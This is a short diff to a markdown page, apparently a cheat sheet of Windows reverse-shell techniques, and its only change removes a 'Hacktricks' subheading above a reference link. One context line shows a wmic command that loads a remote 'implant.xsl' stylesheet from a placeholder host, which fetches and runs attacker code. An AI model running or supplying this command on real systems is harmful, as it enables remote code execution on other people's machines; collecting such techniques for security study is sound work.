@@ -23,6 +23,4 @@ C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/implant.xsl"
 ---
 ## References
 
-### Hacktricks
-
 - [Hacktricks: Windows Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/windows)
